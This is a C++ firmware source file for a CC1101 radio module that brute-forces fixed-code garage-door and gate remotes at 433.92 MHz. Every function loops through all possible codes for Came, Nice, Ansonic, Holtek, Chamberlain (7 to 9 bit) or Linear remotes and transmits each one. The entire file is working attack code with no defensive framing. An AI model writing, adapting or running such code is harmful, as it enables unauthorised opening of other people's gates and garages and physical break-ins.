#include "brute.h"
#include "modules/RF/CC1101.h"



namespace BRUTE {
CC1101_CLASS cc1101;
int16_t counter = 0;
bool sendingFlag = false;

bool CC1101_BRUTE::Came12BitBrute()
{
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();
    encoderState = EncoderStepStart;    
 //   Serial.println(F("Came12BitBrute"));
    int i = 0;
        counter = 0;

    while(i < 4097 ) {
    i++;
 //   Serial.println(i);
    encoderState = EncoderStepStart;
    while(encoderState != EncoderStepReady){
    cameProtocol.yield(i);
    }

    for (size_t j = 0; j < samplesToSend.size(); j=j+2) {
                
                gpio_set_level(CC1101_CCGDO0A, HIGH);
                delayMicroseconds(samplesToSend[j]); 
                gpio_set_level(CC1101_CCGDO0A, LOW);
                delayMicroseconds(samplesToSend[j+1]);                 
        }
            gpio_set_level(CC1101_CCGDO0A, LOW);
    delayMicroseconds(1000);   
    counter++;
    }
    sendingFlag = false;
   return true;
}

bool CC1101_BRUTE::Nice12BitBrute()
{
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();
    encoderState = EncoderStepStart;    
    int i = 0;
        counter = 0;

    while(i < 4097 ) {
    i++;
    encoderState = EncoderStepStart;
    while(encoderState != EncoderStepReady){
    niceFloProtocol.yield(i);
    }

    for (size_t j = 0; j < samplesToSend.size(); j=j+2) {
                
                gpio_set_level(CC1101_CCGDO0A, HIGH);
                delayMicroseconds(samplesToSend[j]); 
                gpio_set_level(CC1101_CCGDO0A, LOW);
                delayMicroseconds(samplesToSend[j+1]);                 
        }
            gpio_set_level(CC1101_CCGDO0A, LOW);
    delayMicroseconds(1000);   
    counter++;
    }
    sendingFlag = false;
   return true;
}

bool CC1101_BRUTE::Ansonic12BitBrute() {
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();

    for (int i = 0; i < 4097; i++) {
        ansonicProtocol.startEncoding(i, 12);
        const std::vector<long long int>& samples = ansonicProtocol.getEncodedSamples();
        for (size_t j = 0; j < samples.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(samples[j]);
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(samples[j + 1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        delayMicroseconds(10);
        counter++;
    }
    return true;
}

bool CC1101_BRUTE::Holtek12BitBrute() {
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();

    for (int i = 0; i < 4097; i++) {
        holtekProtocol.startEncoding(i, 12);
        const std::vector<long long int>& samples = holtekProtocol.getEncodedSamples();
        for (size_t j = 0; j < samples.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(samples[j]);
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(samples[j + 1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        delayMicroseconds(10);
        counter++;
    }
    return true;
}

// In brute.cpp, implement the helper and wrapper functions:

bool CC1101_BRUTE::ChamberlainCodeBrute(uint8_t bitCount) {
    // Accept only 7, 8, or 9 bits.
    if (bitCount < 7 || bitCount > 9) {
        return false;
    }
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();

    // The maximum code value is 2^bitCount.
    uint32_t maxCode = 1 << bitCount;
    for (uint32_t code = 0; code < maxCode; code++) {
        chamberlainProtocol.startEncoding(code, bitCount);
        const std::vector<long long int>& samples = chamberlainProtocol.getEncodedSamples();
        for (size_t j = 0; j < samples.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(samples[j]);
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(samples[j + 1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        delayMicroseconds(10);
        counter++;
    }
    sendingFlag = false;
    return true;
}

bool CC1101_BRUTE::Chamberlain7BitBrute() {
    return ChamberlainCodeBrute(7);
}

bool CC1101_BRUTE::Chamberlain8BitBrute() {
    return ChamberlainCodeBrute(8);
}

bool CC1101_BRUTE::Chamberlain9BitBrute() {
    return ChamberlainCodeBrute(9);
}

bool CC1101_BRUTE::Linear10BitBrute() {
    sendingFlag = true;
    pinMode(CC1101_CCGDO0A, OUTPUT);
    digitalWrite(CC1101_CCGDO0A, LOW);
    cc1101.setFrequency(433.92);
    cc1101.setCC1101Preset(AM650);
    cc1101.loadPreset();
    cc1101.initRaw();

    // For 10-bit linear protocol, brute-force codes from 0 to 1023.
    uint32_t maxCode = 1U << 10;
    for (uint32_t code = 0; code < maxCode; code++) {
        linearProtocol.startEncoding(code, 10);
        const std::vector<long long int>& samples = linearProtocol.getEncodedSamples();
        for (size_t j = 0; j < samples.size(); j += 2) {
            gpio_set_level(CC1101_CCGDO0A, HIGH);
            delayMicroseconds(samples[j]);
            gpio_set_level(CC1101_CCGDO0A, LOW);
            delayMicroseconds(samples[j + 1]);
        }
        gpio_set_level(CC1101_CCGDO0A, LOW);
        delayMicroseconds(1000);
        counter++;
    }
    sendingFlag = false;
    return true;
}



}